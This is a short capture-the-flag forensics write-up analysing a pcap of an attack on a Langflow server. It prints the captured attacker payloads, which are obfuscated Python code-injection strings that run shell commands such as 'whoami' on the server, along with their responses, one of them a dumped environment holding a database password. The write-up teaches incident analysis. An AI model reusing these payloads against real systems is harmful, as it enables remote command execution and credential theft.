status: #pwnd 
ctf: #hacktheboo2025 
level: #easy 
type: #forensic 
challenge: watchtower of mists 
helper: #pcap 

---

# pcap file 
- open pcap file in wireshark 
- statistics -> capture file properties -> the file contains 142 packets 
- file -> export objects -> http -> save all -> 20 files saved

# file analysis 
- first we check what type of files we downloaded 

```
pamo$ file * 

add:                                    HTML document, ASCII text 
address:                                HTML document, ASCII text 
admin:                                  HTML document, ASCII text 
admins:                                 HTML document, ASCII text 
advanced:                               HTML document, ASCII text 
advanced_search:                        HTML document, ASCII text 
alert:                                  HTML document, ASCII text 
bd5018db-3d0a-4f83-9143-4b334d67cdeb:   HTML document, ASCII text 
code:                                   JSON data 
code(1):                                JSON data 
code(2):                                JSON data 
code(3):                                JSON data 
code(4):                                JSON data 
code(5):                                JSON data 
code(6):                                JSON data 
code(7):                                JSON data 
config:                                 JSON data 
v1:                                     HTML document, ASCII text 
version:                                JSON data 
``` 

- looking at the HTML files we dont find anything interesting 
- now the code JSON data files. We find python code an the corresponding responses 

```json 
{ 
	"code": "\ndef run(cd=exec(__import__('zlib').decompress(__import__('base64').b64decode('eJ wFwcEJgDAMAMBVJK8WxA18uoH/UEugwdaEpEHH984KOy3HV0kny5MQeajYREzgcalJJXfIW21Ub5 SYGjPB26QMhnXxRr3vpwXl/ANKDhvB')).decode())): pass\n" 
} 
{ 
	"imports": { 
		"errors": [] 
	}, 
	"function": { 
		"errors": [ "b'user\\n'" ] 
	} 
} 
{ 
	"code": "\ndef run(cd=exec(__import__('zlib').decompress(__import__('base64').b64decode('eJ wFwcsJgDAMANBVJKcWxA08uoH3oDHQYDUlH3B837NDnKftIx4h+hZEeYZaIBbwPIcpsTvUhRrTjZ oxMgrIBfPkjXtfd0uu9QfWXRoJ')).decode())): pass\n" 
} 
{ 
	"imports": { 
		"errors": [] 
	}, 
	"function": { 
		"errors": [ "b'uid=1000(user) gid=0(root) groups=0(root)\\n'" ] 
	} 
} 
{ 
	"code": "\ndef run(cd=exec(__import__('zlib').decompress(__import__('base64').b64decode('eJ wFwcEJgDAMAMBVSl4tiBv4dAP/QUOgxdqEJhHH926ezTjtH7F6k5ER26MyHTGDxaVTiM2grFSZbp RwDc/A44UlWeXet2MGl/ID83MahQ==')).decode())): pass\n" 
} 
{ 
	"imports": { 
		"errors": [] 
	}, 
	"function": { 
		"errors": [ "b'TOKENIZERS_PARALLELISM=false\\nHOSTNAME=aisrv01\\nPYTHON_PIP_VERSION=24.0 \\nHOME=/app/data\\nLANGFLOW_DATABASE_URL=postgresql://langflow:LnGFlWPasswo rd2025@postgres:5432/langflow\\nLANGFLOW_HOST=0.0.0.0\\nGPG_KEY=7169605F62C7 51356D054A26A821E680E5FA6305\\nOPENAI_API_KEY=dummy\\nASTRA_ASSISTANTS_QUIET =true\\nLANGFLOW_PORT=7860\\nLANGFLOW_CONFIG_DIR=app/langflow\\nPYTHON_GET_P IP_URL=https://github.com/pypa/get- pip/raw/dbf0c85f76fb6e1ab42aa672ffca6f0a675d9ee4/public/get- pip.py\\nSERVER_SOFTWARE=gunicorn/23.0.0\\nGRPC_VERBOSITY=ERROR\\nPATH=/app/ .venv/bin:/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/ sbin:/bin\\nTIKTOKEN_CACHE_DIR=/app/.venv/lib/python3.12/site- packages/litellm/litellm_core_utils/tokenizers\\nLANG=C.UTF- 8\\nPYTHON_VERSION=3.12.3\\nPWD=/app\\nPYTHON_GET_PIP_SHA256=dfe9fd5c28dc98b 5ac17979a953ea550cec37ae1b47a5116007395bfacff2ab9\\nUSER_AGENT=langflow\\n'" 
		] 
	} 
} 
{ 
	"code": "\ndef run(cd=exec(__import__('zlib').decompress(__import__('base64').b64decode('eJ wNyE0LgjAYAOC/MnZSKguNqIOCpAdDK8IIT0Pnyza1JvsIi+i313N8VC00oHSiMBohHw4h4j5KZQ hxsLbNqCQFrbHrUQ60J9Ka0RoHA+USUZ+x/Nazs6hY7l+GVuxWVRA/i7KY8i62x3dmi/02OCXXV5 bEs0OXhp+m1rBZo8WiBSpbQFGEvkvvv1xRPEeawzCEpbLguj8DMjVN')).decode())): pass\n" 
} 
{ 
	"imports": { 
		"errors": [] 
	}, 
	"function": { 
		"errors": [ 
		"b''" 
		] 
	} 
}
```

- we can simply copy the python code and execute it to see what the decoded strings say

```python
__import__('zlib').decompress(__import__('base64').b64decode('eJwFwcEJgDAMAM BVJK8WxA18uoH/UEugwdaEpEHH984KOy3HV0kny5MQeajYREzgcalJJXfIW21Ub5SYGjPB26QMhn XxRr3vpwXl/ANKDhvB')).decode() 

> 'raise Exception(__import__("subprocess").check_output("whoami", shell=True))'
```

- we can see the attacker executes shell commands, in this example the `whoami` command 
- we can decode all the strings in this way 
- also we can just look at the responses to see what information the attacker got out of the system and we see he exfiltrated the environment variables which contain the postgres password and maybe other relevant information 
- the last two JSON files `config` and `version` contain interesting information about the langflow version which we can look up if there are any know vulnerability 
- this way we can easily find all the flags we are looking for